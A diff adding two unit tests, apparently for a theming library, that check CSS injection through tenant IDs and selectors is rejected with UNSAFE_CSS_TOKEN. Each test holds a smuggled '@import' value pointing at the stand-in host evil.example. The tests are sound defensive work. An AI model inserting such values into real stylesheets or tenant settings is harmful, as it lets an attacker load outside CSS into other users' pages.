@@ -194,3 +194,21 @@ test('serializeThemePatch — tenant-derived selector <>-breakout (adversarial-v
     ),
   ).toBe('UNSAFE_CSS_TOKEN')
 })
+
+test('applyThemePatch — tenant-derived layer @import-статемент-инъекция (adversarial-verify P6.1 round 2, HIGH) throws UNSAFE_CSS_TOKEN', () => {
+  const base = fullBase()
+  const tenantId = 'x; @import "https://evil.example/x.css"; y'
+  expect(
+    code(() =>
+      applyThemePatch(base, { color: { bg: { page: '#101014' } } }, { layer: `tenant-${tenantId}` }),
+    ),
+  ).toBe('UNSAFE_CSS_TOKEN')
+})
+
+test('serializeThemePatch — tenant-derived selector @import-статемент-инъекция (adversarial-verify P6.1 round 2, HIGH) throws UNSAFE_CSS_TOKEN', () => {
+  const base = fullBase()
+  const selector = '@import "https://evil.example/x.css";*'
+  expect(
+    code(() => serializeThemePatch(base, { color: { bg: { page: '#101014' } } }, { selector })),
+  ).toBe('UNSAFE_CSS_TOKEN')
+})
